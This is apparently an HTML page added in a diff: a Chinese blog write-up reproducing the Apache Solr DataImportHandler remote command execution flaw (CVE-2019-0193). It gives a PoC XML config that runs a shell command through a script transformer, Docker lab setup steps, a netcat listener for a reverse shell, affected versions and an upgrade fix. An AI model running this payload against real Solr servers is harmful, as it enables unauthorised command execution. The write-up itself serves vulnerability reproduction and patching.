@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Apache Solr 远程命令执行漏洞复现 - Geekby&#39;s Blog</title><meta name="Description" content="Apache Solr 远程命令执行漏洞复现"><meta property="og:title" content="Apache Solr 远程命令执行漏洞复现" />
+<meta property="og:description" content="Apache Solr 远程命令执行漏洞复现" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-08-07T20:00:00+08:00" />
+<meta property="article:modified_time" content="2019-08-07T20:00:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Apache Solr 远程命令执行漏洞复现"/>
+<meta name="twitter:description" content="Apache Solr 远程命令执行漏洞复现"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="https://www.geekby.site/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" /><link rel="next" href="https://www.geekby.site/2019/08/hacktheboxlame/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Apache Solr 远程命令执行漏洞复现",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2019\/08\/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "漏洞复现, Solr","wordcount":  252 ,
+        "url": "https:\/\/www.geekby.site\/2019\/08\/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\/","datePublished": "2019-08-07T20:00:00+08:00","dateModified": "2019-08-07T20:00:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "Apache Solr 远程命令执行漏洞复现"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Apache Solr 远程命令执行漏洞复现</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><i class="far fa-folder fa-fw"></i>漏洞复现</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-08-07">2019-08-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 252 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#poc">POC</a></li>
+    <li><a href="#漏洞成因">漏洞成因</a></li>
+    <li><a href="#环境搭建">环境搭建</a>
+      <ul>
+        <li><a href="#solr部署">solr部署</a></li>
+        <li><a href="#开启dataimporthandler插件">开启DataImportHandler插件</a>
+          <ul>
+            <li><a href="#新建core">新建core：</a></li>
+          </ul>
+        </li>
+        <li><a href="#dataimporthandler-插件配置">DataImportHandler 插件配置</a></li>
+        <li><a href="#重启-solr">重启 solr</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞测试">漏洞测试</a>
+      <ul>
+        <li><a href="#访问管理页面">访问管理页面</a></li>
+        <li><a href="#开启-debug-模式">开启 Debug 模式</a></li>
+        <li><a href="#开启监听">开启监听</a></li>
+        <li><a href="#执行命令">执行命令</a></li>
+      </ul>
+    </li>
+    <li><a href="#影响范围">影响范围</a></li>
+    <li><a href="#修复建议">修复建议</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="apache-solr-远程命令执行漏洞">Apache Solr 远程命令执行漏洞</h1>
+<p>2019 年 8 月 1 日，Apache Solr 官方发布了 CVE-2019-0193 漏洞预警，漏洞危害评级为严重。</p>
+<p>此次漏洞出现在 Apache Solr 的 DataImportHandler ，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的 DIH 配置都可以通过外部请求的 dataConfig 参数来设置。由于 DIH 配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</p>
+<p>360CERT 判断漏洞等级为高，建议 Apache Solr 用户及时升级以防止攻击者攻击。</p>
+<h2 id="poc">POC</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-XML" data-lang="XML"><span class="nt">&lt;dataConfig&gt;</span>
+    <span class="nt">&lt;script&gt;</span><span class="cp">&lt;![CDATA[
+</span><span class="cp">                function f1(row){
+</span><span class="cp">                    var run = java.lang.Runtime.getRuntime().exec(&#34;touch /tmp/success&#34;);
+</span><span class="cp">                    row.put(&#39;name&#39;, &#39;Hello World!&#39;);
+</span><span class="cp">                    return row;
+</span><span class="cp">                }
+</span><span class="cp">    ]]&gt;</span><span class="nt">&lt;/script&gt;</span>
+    <span class="nt">&lt;document&gt;</span>
+        <span class="nt">&lt;entity</span> <span class="na">name=</span><span class="s">&#34;person&#34;</span> <span class="na">transformer=</span><span class="s">&#34;script:f1&#34;</span> <span class="na">query=</span><span class="s">&#34;select * from person&#34;</span> <span class="na">pk=</span><span class="s">&#34;id&#34;</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;field</span> <span class="na">column=</span><span class="s">&#34;id&#34;</span> <span class="na">name=</span><span class="s">&#34;id&#34;</span> <span class="nt">/&gt;</span>
+            <span class="nt">&lt;field</span> <span class="na">column=</span><span class="s">&#34;name&#34;</span> <span class="na">name=</span><span class="s">&#34;name&#34;</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;/entity&gt;</span>
+    <span class="nt">&lt;/document&gt;</span>
+<span class="nt">&lt;/dataConfig&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞成因">漏洞成因</h2>
+<p>该漏洞的产生是由于两方面的原因：</p>
+<ul>
+<li>用户在 <code>solrconfig.xml</code> 文件中设置了 <code>DataImportHandler</code>，开启了 <code>DataImport</code> 功能。</li>
+<li><code>DataImportHandler</code> 模块允许用户自己包含脚本，来进行配置。</li>
+</ul>
+<p>攻击者可以通过构造恶意的脚本交由转换器进行解析，在Solr解析的过程中并未对用户的输入做检查，可导致攻击者远程在Solr服务器上执行命令。</p>
+<h2 id="环境搭建">环境搭建</h2>
+<h3 id="solr部署">solr部署</h3>
+<p>本环境采用docker部署
+拉取镜像：docker pull solr: 8.1.1
+启动容器：docker run &ndash;name solr -d -p 8983:8983 -t solr:8.1.1
+访问 <code>http://IP:8983/</code>，apache solr 框架部署完毕
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203033.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203033.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203033.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203033.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203033.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203033.png-water_print" /></p>
+<h3 id="开启dataimporthandler插件">开启DataImportHandler插件</h3>
+<h4 id="新建core">新建core：</h4>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203222.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203222.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203222.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203222.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203222.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807203222.png-water_print" />
+点击Add Core，solr系统报错。</p>
+<p>然后执行：docker exec -it &ndash;user root solr /bin/bash，进入 solr 容器。</p>
+<p>进入容器后，执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cp /opt/solr-8.1.1/server/solr/configsets/_default/conf  /var/solr/data/new_core/
+cp /opt/solr/dist/solr-dataimporthandler-8.1.1.jar /opt/solr/server/solr-webapp/webapp/WEB-INF/lib
+cp /opt/solr/dist/solr-dataimporthandler-extras-8.1.1.jar /opt/solr/server/solr-webapp/webapp/WEB-INF/lib
+<span class="nb">cd</span> /var/solr/data/new_core/conf/
+vim solrconfig.xml
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="dataimporthandler-插件配置">DataImportHandler 插件配置</h3>
+<p>将下面的 XML 添加到<code>solrconfig.xml</code>中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-XML" data-lang="XML"><span class="nt">&lt;requestHandler</span> <span class="na">name=</span><span class="s">&#34;/dataimport&#34;</span>  
+                <span class="na">class=</span><span class="s">&#34;org.apache.solr.handler.dataimport.DataImportHandler&#34;</span> <span class="nt">&gt;</span> 
+    <span class="nt">&lt;lst</span> <span class="na">name=</span><span class="s">&#34;defaults&#34;</span><span class="nt">&gt;</span> 
+      <span class="nt">&lt;str</span> <span class="na">name=</span><span class="s">&#34;config&#34;</span><span class="nt">&gt;</span>data-config.xml<span class="nt">&lt;/str&gt;</span> 
+    <span class="nt">&lt;/lst&gt;</span> 
+<span class="nt">&lt;/requestHandler&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>注</code>：XML 的格式一定按照上述格式，否则会报错！</p>
+<p>执行<code>vim data-config.xml</code>，并将下面 XML 保存至该文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-XML" data-lang="XML"><span class="nt">&lt;dataConfig&gt;</span>
+    <span class="nt">&lt;dataSource</span> <span class="na">driver=</span><span class="s">&#34;com.mysql.jdbc.Driver&#34;</span> <span class="na">url=</span><span class="s">&#34;jdbc:mysql://IP:3306/securityTest&#34;</span> <span class="na">user=</span><span class="s">&#34;root&#34;</span> <span class="na">password=</span><span class="s">&#34;root&#34;</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;document&gt;</span>
+        <span class="nt">&lt;entity</span> <span class="na">name=</span><span class="s">&#34;person&#34;</span> <span class="na">query=</span><span class="s">&#34;select * from person&#34;</span> <span class="na">pk=</span><span class="s">&#34;id&#34;</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;field</span> <span class="na">column=</span><span class="s">&#34;id&#34;</span> <span class="na">name=</span><span class="s">&#34;id&#34;</span> <span class="nt">/&gt;</span>
+            <span class="nt">&lt;field</span> <span class="na">column=</span><span class="s">&#34;name&#34;</span> <span class="na">name=</span><span class="s">&#34;name&#34;</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;/entity&gt;</span>
+    <span class="nt">&lt;/document&gt;</span>
+<span class="nt">&lt;/dataConfig&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>然后将 <code>mysql-connector-java-5.1.48.jar</code> 放入 <code>/opt/solr/server/solr-webapp/webapp/WEB-INF/lib</code> 文件夹下</p>
+<h3 id="重启-solr">重启 solr</h3>
+<p>然后重启 solr：<code>./opt/solr/bin/solr restart</code></p>
+<p>至此，漏洞环境搭建完毕，搭建成功的截图如下：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204045.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204045.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204045.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204045.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204045.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204045.png-water_print" /></p>
+<h2 id="漏洞测试">漏洞测试</h2>
+<h3 id="访问管理页面">访问管理页面</h3>
+<p>浏览器访问：<code>http://IP:8983/</code></p>
+<h3 id="开启-debug-模式">开启 Debug 模式</h3>
+<p>将 poc 复制到 Configuration 中：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204426.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204426.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204426.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204426.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204426.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204426.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204958.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204958.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204958.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204958.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204958.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807204958.png-water_print" /></p>
+<p>可在标注的地方更换受害机执行的命令，本文以反弹<code>shell</code>为例。</p>
+<h3 id="开启监听">开启监听</h3>
+<p><code>nc -lp 4567</code></p>
+<h3 id="执行命令">执行命令</h3>
+<p>点击 <code>Execute with this Configuration</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205043.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205043.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205043.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205043.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205043.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205043.png-water_print" /></p>
+<p>执行成功可以发现shell已经成功反弹：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205235.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205235.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205235.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205235.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205235.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190807205235.png-water_print" /></p>
+<h2 id="影响范围">影响范围</h2>
+<ul>
+<li>Apache Solr &lt; 8.2.0</li>
+</ul>
+<h2 id="修复建议">修复建议</h2>
+<ul>
+<li>将Apache Solr 升级至 8.2.0 或之后的版本</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2019-08-07</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-title="Apache Solr 远程命令执行漏洞复现"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-title="Apache Solr 远程命令执行漏洞复现"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-title="Apache Solr 远程命令执行漏洞复现"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>,&nbsp;<a href="/tags/solr/">Solr</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2019/08/cve-2019-14361cve-2019-14379%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="prev" rel="prev" title="CVE-2019-14361与CVE-2019-14379漏洞复现"><i class="fas fa-angle-left fa-fw"></i>CVE-2019-14361与CVE-2019-14379漏洞复现</a>
+            <a href="/2019/08/hacktheboxlame/" class="next" rel="next" title="Hack The Box —— Lame">Hack The Box —— Lame<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
